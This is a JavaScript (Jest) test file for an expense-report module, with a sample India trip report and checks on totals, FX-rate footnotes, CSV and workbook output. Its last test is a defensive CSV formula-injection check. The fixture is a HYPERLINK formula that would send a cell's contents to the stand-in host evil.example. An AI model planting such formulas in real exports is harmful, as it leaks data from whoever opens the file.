const doc = require('./expense-doc');

const payload = {
  company: { name: 'Solv Pte Ltd', baseCurrency: 'SGD', timezone: 'Asia/Singapore', fxPolicy: 'receipt_date', reportColumns: ['Air & Transport', 'Lodging', 'Meals', 'Entertainment', 'Phone', 'Fuel/Mileage', 'Other'] },
  report: { number: 'EXP-2026-0007', kind: 'trip', title: 'India trip', purpose: 'Client site visits, India', periodFrom: '2026-08-31', periodTo: '2026-09-04', destination: 'Mumbai and Pune, India', nights: 4,
            status: 'claimed', claimedAt: '2026-09-10T06:02:00Z', advances: 0, notes: null },
  owner: { name: 'Aisha Mei Ling Rahman', employeeId: 'S0001', department: 'Sales', email: 'aisha@solv.sg' },
  lines: [
    { ref: 'R1', date: '2026-09-01', merchant: 'JW Marriott Mumbai Sahar', purpose: 'Client visit', description: 'Rooms', category: 'Lodging', currency: 'INR', amount: 20738.5, fxRate: 0.01341, fxRateDate: '2026-09-01', fxSource: 'frankfurter', fxFetchedAt: '2026-09-18T03:58:00Z', baseAmount: 278.1, onBehalfOf: null, tax: 3379.5 },
    { ref: 'R1', date: '2026-09-01', merchant: 'JW Marriott Mumbai Sahar', purpose: 'Client visit', description: 'Rooms', category: 'Lodging', currency: 'INR', amount: 20737.5, fxRate: 0.01341, fxRateDate: '2026-09-01', fxSource: 'frankfurter', fxFetchedAt: '2026-09-18T03:58:00Z', baseAmount: 278.09, onBehalfOf: 'Lim Wei Jie', tax: null },
    { ref: 'R2', date: '2026-09-04', merchant: 'Courtyard By Marriott Pune Chakan', purpose: null, description: 'MoMo Cafe', category: 'Meals', currency: 'INR', amount: 6426.57, fxRate: 0.0135, fxRateDate: '2026-09-04', fxSource: 'manual', fxOverrideBy: 'aisha@solv.sg', fxOverrideReason: 'card statement', fxFetchedAt: 'x', baseAmount: 86.76, onBehalfOf: null, tax: null },
    { ref: 'R3', date: '2026-09-02', merchant: 'Grab', purpose: null, description: 'Airport', category: 'Software/Utilities', currency: 'SGD', amount: 18.4, fxRate: 1, fxRateDate: '2026-09-02', fxSource: 'base', fxFetchedAt: 'x', baseAmount: 18.4, onBehalfOf: null, tax: 0 },
  ],
  receipts: [{ ref: 'R1', title: 'JW Marriott Mumbai Sahar', pages: [] }, { ref: 'R2', title: 'Courtyard Pune', pages: [] }, { ref: 'R3', title: 'Grab', pages: [] }],
  generatedAt: '2026-09-18T04:00:00Z',
};

describe('reports/expense-doc', () => {
  test("columns are the company's, collapsed to those used plus Other for a category outside the list", () => {
    const m = doc.buildModel(payload);
    expect(m.columns).toEqual(['Lodging', 'Meals', 'Other']);
    expect(m.rows).toHaveLength(4);
    expect(m.rows[0].cells).toEqual({ Lodging: 278.1 });
    expect(m.rows[3].cells).toEqual({ Other: 18.4 });
    expect(m.categoryTotals).toEqual({ Lodging: 556.19, Meals: 86.76, Other: 18.4 });
    expect(m.total).toBe(661.35);
    expect(m.reimbursement).toBe(661.35);
    expect(m.rows[1].description).toMatch(/‡$/);
  });

  test('the rate footnote names each (currency, date, source) once, lists manual rates with who and why, and states the rounding rule', () => {
    const m = doc.buildModel(payload);
    expect(m.rateNotes).toHaveLength(2);
    expect(m.rateNotes[0]).toMatch(/INR→SGD 0\.01341, European Central Bank reference rate for 1 Sep 2026, via Frankfurter, fetched 18 Sep 2026/);
    expect(m.rateNotes[1]).toMatch(/INR→SGD 0\.0135 entered by aisha@solv\.sg on 4 Sep 2026: card statement/);
    expect(m.notes.join(' ')).toMatch(/rounded to the cent/);
    expect(m.notes.join(' ')).toMatch(/Lim Wei Jie/);
    expect(m.notes.join(' ')).toMatch(/foreign tax/i);
  });

  test('the CSV has one row per line with the base amount, and the workbook model has four sheets', () => {
    const csv = doc.expenseReportCsv(payload);
    expect(csv.split('\n')[0]).toBe('Report,Line,Date,Merchant,Description,Purpose,On behalf of,Category,Currency,Amount,Rate,Rate date,Rate source,SGD,Receipt');
    expect(csv.split('\n')).toHaveLength(5);
    expect(csv).toContain('EXP-2026-0007,1,2026-09-01,JW Marriott Mumbai Sahar,Rooms,Client visit,,Lodging,INR,20738.50,0.01341,2026-09-01,frankfurter,278.10,R1');
    expect(doc.workbookModel(payload).sheets.map(s => s.name)).toEqual(['Cover', 'Lines', 'Rates', 'Receipts']);
    expect(doc.exportFilename(payload)).toBe('EXP-2026-0007_Aisha-Mei-Ling-Rahman');
  });

});

// A cell that starts with = + - @ is a formula to Excel, quoted or not, and
// merchants and purposes come from receipts and from people.
describe('reports/expense-doc — missing rates', () => {
  test('a line without a rate is left out of the totals, and the notes say so', () => {
    const p = { ...payload, lines: [...payload.lines, { ref: 'R4', date: '2026-09-03', merchant: 'Pending', category: 'Meals', currency: 'VND', amount: 500000, fxRate: null, baseAmount: null }] };
    const m = doc.buildModel(p);
    expect(m.notes.join(' ')).toMatch(/1 line has no exchange rate yet/);
    expect(m.total).toBe(doc.buildModel(payload).total);
  });
});

describe('reports/expense-doc — CSV formula injection', () => {
  test('text that would be a formula is neutralised; numbers keep their sign', () => {
    const evil = { ...payload, lines: [{ ...payload.lines[3], merchant: '=HYPERLINK("https://evil.example/?x="&A1,"Click")', purpose: '@SUM(1+1)', description: '-cmd' }] };
    const csv = doc.expenseReportCsv(evil);
    const row = csv.split('\n')[1];
    expect(row).toContain(`"'=HYPERLINK(""https://evil.example/?x=""&A1,""Click"")"`);
    expect(row).toContain("'@SUM(1+1)");
    expect(row).toContain("'-cmd");
    expect(row).not.toMatch(/,=|,"=/);
    expect(row).toContain(',18.40,');
  });
});
